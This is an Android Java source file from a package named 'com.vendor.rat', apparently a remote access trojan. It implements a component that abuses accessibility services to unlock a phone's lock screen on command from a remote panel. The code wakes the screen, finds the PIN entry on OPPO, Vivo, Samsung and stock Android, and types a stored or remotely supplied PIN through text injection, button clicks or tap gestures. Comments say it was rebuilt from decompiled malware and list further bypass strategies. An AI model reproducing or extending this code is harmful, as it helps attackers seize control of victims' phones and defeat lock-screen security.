package com.vendor.rat.auto.engine;

import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.credential.LockCredentialStore;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 锁屏密码验证代理
 *
 * Vendor: o/i.java (266 行) + o/h.java (196 行)
 *
 * K() 方法 (1468 条指令, 反编译失败) 逆向分析结论:
 * 5 级 fallback 策略:
 *   1. EditText + ACTION_SET_TEXT → Enter (keyevent 66)
 *   2. PIN 键盘按钮 by resource-id (keyboard_num 容器)
 *   3. PIN 键盘按钮 by text/content-desc
 *   4. ADB shell "input text" (需要已建立 ADB 连接)
 *   5. 图案锁 dispatchGesture (patternCipher 坐标点)
 *
 * 本实现覆盖策略 1-3, 策略 4-5 需要 ADB 连接或图案数据, 暂不实现。
 *
 * 关键: vendor o/h.java (DeviceCredentialDelegate) 同时监听三个包名:
 *   - com.android.systemui (OPPO/通用 ConfirmDeviceCredentialActivity)
 *   - com.android.settings (ConfirmLockPassword)
 *   - com.samsung.android.biometrics.app.setting (三星)
 */
public class ConfirmLockDelegate extends AutoEngine {

    private static final String TAG = "ConfirmLockDelegate";

    private static final String SETTINGS = "com.android.settings";
    private static final String SYSTEM_UI = "com.android.systemui";
    private static final String SAMSUNG_BIO = "com.samsung.android.biometrics.app.setting";

    public final String settingsPackage;
    public final ConcurrentLinkedQueue<String> processedActions;

    /** Callback for PIN verification result */
    private static volatile Runnable onVerifySuccess;
    /** Direct PIN override — bypasses LockCredentialStore */
    private static volatile String directPin;
    /** Only process when Panel explicitly requests unlock */
    private static volatile boolean unlockRequested = false;

    public static void setOnVerifySuccess(Runnable callback) {
        onVerifySuccess = callback;
    }

    public static void setDirectPin(String pin) {
        directPin = pin;
    }

    /** Called by CommandDispatcher.handleUnlock() to arm the delegate */
    public static void requestUnlock() {
        unlockRequested = true;
    }

    public ConfirmLockDelegate() {
        // 对齐 vendor o/h.java: primaryPackage 设为 systemui, 但 listenWindows 覆盖三个包名
        super(createListenWindows(), SYSTEM_UI);
        this.settingsPackage = SETTINGS;
        this.processedActions = new ConcurrentLinkedQueue<>();
    }

    @Override
    public void execute() {
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        if (!unlockRequested) return; // 只在 Panel 主动请求解锁时才处理
        if (isLockScreen(className) || isSystemUiKeyguard(packageName, className)) {
            Log.d(TAG, "已进入锁屏密码验证代理, pkg=" + packageName + " cls=" + className);
            if (!processedActions.contains("inConfirmLock")) {
                processedActions.add("inConfirmLock");
                scheduler.execute(new Runnable() {
                    @Override
                    public void run() {
                        handleConfirmLock();
                    }
                });
            }
        }
    }

    /**
     * 解锁逻辑入口 — 对齐 vendor K() 的 5 级 fallback (实现前 3 级)
     */
    private void handleConfirmLock() {
        try {
            Log.d(TAG, "开始处理锁屏确认");

            String pin = directPin != null ? directPin : LockCredentialStore.getPin();
            if (pin == null || pin.isEmpty()) {
                Log.w(TAG, "No stored PIN available, cannot auto-input");
                processedActions.remove("inConfirmLock");
                return;
            }

            // Wait for screen to be on and UI to render
            for (int w = 0; w < 10; w++) {
                android.os.PowerManager pwm = (android.os.PowerManager)
                        MyAccessibilityService.getInstance().getSystemService(android.content.Context.POWER_SERVICE);
                if (pwm != null && pwm.isInteractive()) break;
                Log.d(TAG, "Waiting for screen to turn on... (" + w + ")");
                sleep(500);
            }
            sleep(1000);

            // 必须遍历所有窗口找 systemui/settings 的 root
            // activateRoot()/k() 只返回 getRootInActiveWindow()，
            // 当遮罩覆盖时可能返回错误窗口的节点树
            UiNode root = findLockScreenRoot();
            if (root == null) {
                Log.w(TAG, "No lock screen root found, retrying...");
                sleep(1000);
                root = findLockScreenRoot();
            }
            if (root == null) {
                Log.w(TAG, "No lock screen root found after retry");
                processedActions.remove("inConfirmLock");
                return;
            }

            // 5 级 fallback (实现前 3 级)
            if (tryHandleOppoPin(root, pin)) {
                Log.d(TAG, "PIN input completed successfully");
                unlockRequested = false;
                com.vendor.rat.activity.WakeActivity.finishIfAlive();
                Runnable cb = onVerifySuccess;
                if (cb != null) {
                    onVerifySuccess = null;
                    cb.run();
                }
            } else {
                Log.w(TAG, "Failed to auto-input PIN via all strategies");
                unlockRequested = false;
                com.vendor.rat.activity.WakeActivity.finishIfAlive();
            }

            processedActions.remove("inConfirmLock");
        } catch (Exception e) {
            logError("handleConfirmLock", e);
            processedActions.remove("inConfirmLock");
        }
    }

    /**
     * 遍历所有无障碍窗口，找到 systemui 或 settings 的锁屏 root 节点。
     * getRootInActiveWindow() 在遮罩覆盖时可能返回错误窗口。
     */
    private void wakeScreenIfNeeded() {
        try {
            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            if (svc == null) return;
            android.os.PowerManager pm = (android.os.PowerManager)
                    svc.getSystemService(android.content.Context.POWER_SERVICE);
            if (pm != null && !pm.isInteractive()) {
                android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                        android.os.PowerManager.FULL_WAKE_LOCK
                                | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
                                | android.os.PowerManager.ON_AFTER_RELEASE,
                        "vendor:confirmlock");
                wl.acquire(60_000);
                wl.release();
                Log.d(TAG, "wakeScreenIfNeeded: screen woken");
                sleep(500);
            }
        } catch (Exception e) {
            Log.w(TAG, "wakeScreenIfNeeded failed", e);
        }
    }

    private UiNode findLockScreenRoot() {
        MyAccessibilityService svc = MyAccessibilityService.getInstance();
        if (svc == null) return null;

        String[] targetPkgs = {SYSTEM_UI, SETTINGS, SAMSUNG_BIO};

        try {
            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
            if (windows != null) {
                // 优先找 systemui 窗口
                for (String targetPkg : targetPkgs) {
                    for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
                        if (w == null) continue;
                        android.view.accessibility.AccessibilityNodeInfo wRoot = w.getRoot();
                        if (wRoot == null) continue;
                        CharSequence pkg = wRoot.getPackageName();
                        if (pkg != null && pkg.toString().equals(targetPkg)) {
                            Log.d(TAG, "findLockScreenRoot: found pkg=" + targetPkg + " type=" + w.getType());
                            return new UiNode(wRoot);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "findLockScreenRoot windows error", e);
        }

        // fallback: activateRoot
        Log.d(TAG, "findLockScreenRoot: fallback to activateRoot");
        activateRoot();
        return k();
    }

    /**
     * 对齐 vendor K() 的多策略 PIN 输入
     *
     * 策略 1: EditText + ACTION_SET_TEXT (systemui ConfirmDeviceCredentialActivity)
     * 策略 2: PIN 键盘按钮 by resource-id (settings ConfirmLockPassword)
     * 策略 3: PIN 键盘按钮 by content-desc
     */
    private boolean tryHandleOppoPin(UiNode root, String pin) {
        // 策略 0: OPPO systemui 锁屏 PIN 键盘 (pinColorNumericKeyboard 容器)
        Log.d(TAG, "Strategy 0: trying OPPO systemui PIN keypad");
        if (tryInputViaSystemUiKeypad(root, pin)) {
            return waitForConfirmWindowDismissByPolling();
        }

        // 策略 1: EditText setText (vendor: "getEditText" → "setEditText" / "/global/setText")
        Log.d(TAG, "Strategy 1: trying EditText setText");
        if (tryInputViaEditText(root, pin)) {
            return waitForConfirmWindowDismissByPolling();
        }

        // 策略 2: PIN 按钮 by ID (vendor: "Click PIN Node By ID:" + ":id/keyboard_num")
        Log.d(TAG, "Strategy 2: trying PIN buttons by ID");
        if (tryInputViaPinButtonsById(root, pin)) {
            return waitForConfirmWindowDismissByPolling();
        }

        // 策略 3: PIN 按钮 by content-desc (vendor: "Click PIN Node By Text Or Desc:")
        Log.d(TAG, "Strategy 3: trying PIN buttons by content-desc");
        if (tryInputViaDigitButtons(root, pin)) {
            return waitForConfirmWindowDismissByPolling();
        }

        return false;
    }

    /**
     * 策略 0: OPPO systemui 锁屏 PIN 键盘
     * 容器: com.android.systemui:id/pinColorNumericKeyboard
     * 按钮: android.widget.Button, content-desc="0"-"9", text 为空
     * 需要遍历所有窗口找到 keyguard bouncer 窗口
     */
    private boolean tryInputViaSystemUiKeypad(UiNode root, String pin) {
        // 先尝试无障碍节点查找
        UiNode keypad = root.findOneByCombine(CombineFilter.and(
                StringCondition.viewId("com.android.systemui:id/pinColorNumericKeyboard")));
        if (keypad == null) {
            keypad = findKeypadInAllWindows();
        }
        if (keypad == null) {
            for (int retry = 0; retry < 3 && keypad == null; retry++) {
                sleep(500);
                wakeScreenIfNeeded();
                keypad = findKeypadInAllWindows();
            }
        }
        if (keypad != null) {
            Log.d(TAG, "Strategy 0: found keypad via accessibility nodes");
            for (int i = 0; i < pin.length(); i++) {
                char digit = pin.charAt(i);
                UiNode btn = keypad.findOneByCombine(CombineFilter.and(
                        StringCondition.descEquals(String.valueOf(digit))));
                if (btn == null) {
                    Log.w(TAG, "Strategy 0: node search failed for digit " + digit + ", falling back to gesture");
                    return tryInputViaGesture(pin, i);
                }
                btn.click();
                Log.d(TAG, "Strategy 0: clicked digit " + (i + 1) + "/" + pin.length());
                sleep(150);
            }
            return true;
        }

        // 无障碍节点不可见 (OPPO 锁屏限制) → 用 dispatchGesture 坐标点击
        Log.d(TAG, "Strategy 0: nodes not accessible, using gesture tap");
        return tryInputViaGesture(pin, 0);
    }

    /**
     * 通过 dispatchGesture 坐标点击 PIN 数字键
     * OPPO systemui PIN 键盘布局: 3x4 网格, 按比例坐标
     */
    private boolean tryInputViaGesture(String pin, int startIndex) {
        MyAccessibilityService svc = MyAccessibilityService.getInstance();
        if (svc == null) return false;

        int w = svc.getResources().getDisplayMetrics().widthPixels;
        int h = svc.getResources().getDisplayMetrics().heightPixels;

        float[] colX = {0.246f, 0.500f, 0.754f};
        float[] rowY = {0.471f, 0.580f, 0.688f, 0.797f};

        for (int i = startIndex; i < pin.length(); i++) {
            int digit = pin.charAt(i) - '0';
            float tx, ty;
            if (digit == 0) {
                tx = colX[1]; ty = rowY[3];
            } else {
                int idx = digit - 1;
                tx = colX[idx % 3];
                ty = rowY[idx / 3];
            }
            int px = (int) (tx * w);
            int py = (int) (ty * h);

            android.graphics.Path path = new android.graphics.Path();
            path.moveTo(px, py);
            android.accessibilityservice.GestureDescription gesture =
                    new android.accessibilityservice.GestureDescription.Builder()
                            .addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100))
                            .build();
            svc.dispatchGesture(gesture, null, null);
            Log.d(TAG, "Strategy 0 tap: digit " + pin.charAt(i) + " at (" + px + "," + py + ")");
            sleep(300);
        }
        return true;
    }

    private UiNode findKeypadInAllWindows() {
        MyAccessibilityService svc = MyAccessibilityService.getInstance();
        if (svc == null) return null;
        try {
            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
            if (windows == null) return null;
            Log.d(TAG, "findKeypadInAllWindows: " + windows.size() + " windows");
            for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
                if (w == null) continue;
                android.view.accessibility.AccessibilityNodeInfo wRoot = w.getRoot();
                if (wRoot == null) continue;
                CharSequence pkg = wRoot.getPackageName();
                Log.d(TAG, "  window type=" + w.getType() + " pkg=" + pkg);
                if (pkg != null && SYSTEM_UI.equals(pkg.toString())) {
                    UiNode node = new UiNode(wRoot);
                    UiNode keypad = node.findOneByCombine(CombineFilter.and(
                            StringCondition.viewId("com.android.systemui:id/pinColorNumericKeyboard")));
                    if (keypad != null) {
                        Log.d(TAG, "findKeypadInAllWindows: found in window type=" + w.getType());
                        return keypad;
                    }
                    // 也尝试直接在整个树里找 content-desc 数字按钮
                    UiNode btn1 = node.findOneByCombine(CombineFilter.and(
                            StringCondition.className("android.widget.Button"),
                            StringCondition.descEquals("1")));
                    if (btn1 != null) {
                        Log.d(TAG, "findKeypadInAllWindows: found digit button in window type=" + w.getType());
                        return node; // 返回整个窗口 root，让调用者在里面找按钮
                    }
                }
            }
            // fallback: getRootInActiveWindow
            android.view.accessibility.AccessibilityNodeInfo activeRoot = svc.getRootInActiveWindow();
            if (activeRoot != null) {
                UiNode node = new UiNode(activeRoot);
                Log.d(TAG, "findKeypadInAllWindows: trying activeRoot pkg=" + activeRoot.getPackageName());
                UiNode keypad = node.findOneByCombine(CombineFilter.and(
                        StringCondition.viewId("com.android.systemui:id/pinColorNumericKeyboard")));
                if (keypad != null) {
                    Log.d(TAG, "findKeypadInAllWindows: found in activeRoot");
                    return keypad;
                }
                UiNode btn1 = node.findOneByCombine(CombineFilter.and(
                        StringCondition.className("android.widget.Button"),
                        StringCondition.descEquals("1")));
                if (btn1 != null) {
                    Log.d(TAG, "findKeypadInAllWindows: found digit button in activeRoot");
                    return node;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "findKeypadInAllWindows error", e);
        }
        return null;
    }

    /**
     * 策略 1: EditText + ACTION_SET_TEXT
     *
     * OPPO systemui 锁屏使用 EditText (com.android.systemui:id/lockPassword)
     * 真机 dump 确认: class=android.widget.EditText, password=true, focused=true
     */
    private boolean tryInputViaEditText(UiNode root, String pin) {
        // 按 resource-id 查找 (vendor: "getEditText")
        UiNode editText = root.findOneByCombine(CombineFilter.and(
                StringCondition.className("android.widget.EditText"),
                StringCondition.viewId("com.android.systemui:id/lockPassword")));

        // Fallback: settings 包名下的 lockPassword
        if (editText == null) {
            editText = root.findOneByCombine(CombineFilter.and(
                    StringCondition.className("android.widget.EditText"),
                    StringCondition.viewId("com.android.settings:id/lockPassword")));
        }

        // Fallback: 任何 password EditText
        if (editText == null) {
            editText = root.findOneByCombine(CombineFilter.and(
                    StringCondition.className("android.widget.EditText")));
        }

        if (editText == null) {
            Log.d(TAG, "Strategy 1: no EditText found");
            return false;
        }

        Log.d(TAG, "Strategy 1: found EditText, using setText");

        // Focus first
        editText.focus();
        sleep(200);

        // vendor: "/global/setText" → ACTION_SET_TEXT
        boolean result = editText.setText(pin);
        Log.d(TAG, "Strategy 1: setText result=" + result);

        if (result) {
            sleep(300);
            // vendor: M(uiObject) → "input keyevent 66" (Enter)
            // 6 位 PIN 通常自动提交, 但也尝试按 Enter 作为 backup
            pressEnter(editText);
            sleep(500);
        }
        return result;
    }

    /**
     * 策略 2: PIN 键盘按钮 by resource-id
     *
     * vendor: "Click PIN Node By ID:" + ":id/keyboard_num"
     * Settings ConfirmLockPassword 页面有独立数字按钮
     */
    private boolean tryInputViaPinButtonsById(UiNode root, String pin) {
        // 找 keyboard_num 容器
        UiNode keyboard = root.findOneByCombine(CombineFilter.and(
                StringCondition.viewId("com.android.settings:id/keyboard_num")));

        if (keyboard == null) {
            Log.d(TAG, "Strategy 2: no keyboard_num container found");
            return false;
        }

        Log.d(TAG, "Strategy 2: found keyboard_num, clicking digits");
        for (int i = 0; i < pin.length(); i++) {
            char digit = pin.charAt(i);
            UiNode digitBtn = findDigitButton(root, digit);
            if (digitBtn == null) {
                Log.w(TAG, "Strategy 2: cannot find button for digit: " + digit);
                return false;
            }
            digitBtn.click();
            Log.d(TAG, "Strategy 2: clicked digit " + (i + 1) + "/" + pin.length());
            sleep(100);

            if (i < pin.length() - 1) {
                activateRoot();
                UiNode newRoot = k();
                if (newRoot != null) root = newRoot;
            }
        }
        return true;
    }

    /**
     * 策略 3: PIN 按钮 by content-desc
     *
     * vendor: "Click PIN Node By Text Or Desc:"
     * OPPO Settings ConfirmLockPassword 按钮使用 content-desc="0"-"9"
     */
    private boolean tryInputViaDigitButtons(UiNode root, String pin) {
        for (int i = 0; i < pin.length(); i++) {
            char digit = pin.charAt(i);
            UiNode digitBtn = findDigitButton(root, digit);
            if (digitBtn == null) {
                Log.w(TAG, "Strategy 3: cannot find button for digit: " + digit);
                return false;
            }
            digitBtn.click();
            Log.d(TAG, "Strategy 3: clicked digit " + (i + 1) + "/" + pin.length());
            sleep(100);

            if (i < pin.length() - 1) {
                activateRoot();
                UiNode newRoot = k();
                if (newRoot != null) root = newRoot;
            }
        }
        return true;
    }

    /**
     * Find a digit button by content-desc (vendor: "Click PIN Node By Text Or Desc:")
     */
    private UiNode findDigitButton(UiNode root, char digit) {
        // By content-desc
        UiNode btn = root.findOneByCombine(CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.descEquals(String.valueOf(digit))));
        if (btn != null) return btn;

        // Fallback: by text
        btn = root.findOneByCombine(CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.textEquals(String.valueOf(digit))));
        return btn;
    }

    /**
     * Wait for lock screen window to dismiss.
     * Polls up to 5 seconds (25 × 200ms).
     * 对齐 vendor H(): 20 × 100ms = 2s, 我们给更多时间
     */
    private boolean waitForConfirmWindowDismissByPolling() {
        for (int i = 0; i < 25; i++) {
            sleep(200);

            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            if (svc != null) {
                String currentClass = MyAccessibilityService.getCurrentWindowClass();
                if (currentClass != null && !isLockScreen(currentClass)) {
                    Log.d(TAG, "Lock screen dismissed (now: " + currentClass + ")");
                    return true;
                }
            }

            activateRoot();
            UiNode root = k();
            if (root != null) {
                UiNode lockPrompt = root.findOneByCombine(
                        CombineFilter.and(
                                StringCondition.className("android.widget.TextView"),
                                StringCondition.textContains("锁屏密码")));
                if (lockPrompt == null) {
                    Log.d(TAG, "Lock screen UI no longer visible (poll " + (i + 1) + ")");
                    return true;
                }
            }
        }
        Log.w(TAG, "Lock screen dismiss timeout (5s)");
        return false;
    }

    /**
     * 判断是否为锁屏验证界面
     * 对齐 vendor o/i.java I() + o/h.java 监听的所有 Activity
     */
    public static boolean isLockScreen(String className) {
        if (className == null || className.isEmpty()) {
            return false;
        }
        return Objects.equals(className, "com.android.settings.password.ConfirmLockPassword")
                || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern")
                || Objects.equals(className, "com.android.settings.password.ChooseLockGeneric")
                || Objects.equals(className, "com.android.settings.password.ConfirmDeviceCredentialActivity")
                || Objects.equals(className, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
                || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern$InternalActivity");
    }

    /**
     * OPPO/ColorOS: 锁屏 PIN 输入在 systemui 的 FrameLayout 内，
     * 需要检查 KeyguardManager 确认是否真的在锁屏状态
     */
    private boolean isSystemUiKeyguard(String packageName, String className) {
        if (!SYSTEM_UI.equals(packageName)) return false;
        if (!"android.widget.FrameLayout".equals(className)
                && !"android.widget.LinearLayout".equals(className)) return false;
        try {
            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            if (svc == null) return false;
            android.app.KeyguardManager km = (android.app.KeyguardManager)
                    svc.getSystemService(android.content.Context.KEYGUARD_SERVICE);
            return km != null && km.isKeyguardLocked();
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 创建监听窗口列表
     * 对齐 vendor o/h.java M(): 同时监听 systemui + settings + samsung biometrics
     * 对齐 vendor o/i.java L(): settings 下的 ConfirmLockPassword 等
     */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        String[] packages = {SYSTEM_UI, SETTINGS, SAMSUNG_BIO};
        for (String pkg : packages) {
            // ConfirmDeviceCredentialActivity (vendor o/h.java J())
            list.add(new WindowMatcher(pkg, "com.android.settings.password.ConfirmDeviceCredentialActivity")
                    .addEventType(32).addEventType(2048).addEventType(16384));
            // ConfirmLockPassword (vendor o/h.java K() + o/i.java L())
            list.add(new WindowMatcher(pkg, "com.android.settings.password.ConfirmLockPassword")
                    .addEventType(32).addEventType(2048).addEventType(16384));
            // ConfirmLockPattern
            list.add(new WindowMatcher(pkg, "com.android.settings.password.ConfirmLockPattern")
                    .addEventType(32).addEventType(16384));
            // ChooseLockGeneric
            list.add(new WindowMatcher(pkg, "com.android.settings.password.ChooseLockGeneric")
                    .addEventType(32).addEventType(16384));
            // LinearLayout (vendor o/h.java R() — "使用凭证" 按钮容器)
            list.add(new WindowMatcher(pkg, "android.widget.LinearLayout")
                    .addEventType(32).addEventType(2048).addEventType(16384));
            // FrameLayout (OPPO ColorOS 锁屏 PIN 输入在 systemui FrameLayout 内)
            list.add(new WindowMatcher(pkg, "android.widget.FrameLayout")
                    .addEventType(32).addEventType(2048).addEventType(16384));
        }
        // Vivo specific
        list.add(new WindowMatcher(SETTINGS, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
                .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPattern$InternalActivity")
                .addEventType(32).addEventType(16384));
        return list;
    }

    /**
     * vendor H(): waitForUnlock — 20 × 100ms
     */
    public final boolean waitForUnlock() {
        AtomicInteger counter = new AtomicInteger(0);
        while (counter.incrementAndGet() < 20 && isLockScreen(null)) {
            try {
                Thread.sleep(100L);
            } catch (Exception e) {
                Log.e(TAG, "waitForUnlock interrupted", e);
            }
        }
        return !isLockScreen(null);
    }

    /**
     * vendor J(): clickVivoConfirm
     */
    public final void clickVivoConfirm() {
        UiNode root = getRootNode();
        if (root == null) return;

        String pkg = this.settingsPackage;
        String[][] buttons = {
                {"android.view.View", pkg + ":id/mix_confirm"},
                {"android.widget.TextView", pkg + ":id/iv_complete"},
                {"android.widget.Button", pkg + ":id/vivo_pin_confirm"},
                {"android.widget.TextView", pkg + ":id/mix_normal_confirm"}
        };

        for (String[] btn : buttons) {
            CombineFilter filter = CombineFilter.and(
                    StringCondition.className(btn[0]),
                    StringCondition.viewId(btn[1]));
            UiNode node = root.findOneByCombine(filter);
            if (node != null && node.click()) {
                return;
            }
        }
    }

    public static void sleepHalf() {
        try {
            Thread.sleep(500);
        } catch (Exception e) {
            Log.e(TAG, "sleepHalf", e);
        }
    }

    /**
     * vendor M(): pressEnter — "input keyevent 66" 或 uiObject.enter()
     */
    public final void pressEnter(UiNode uiObject) {
        if (uiObject != null && Build.VERSION.SDK_INT >= 30) {
            uiObject.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj) return true;
        if (obj != null && (obj instanceof ConfirmLockDelegate)) {
            return Objects.equals(this.settingsPackage, ((ConfirmLockDelegate) obj).settingsPackage);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(ConfirmLockDelegate.class.getName(), this.settingsPackage);
    }
}
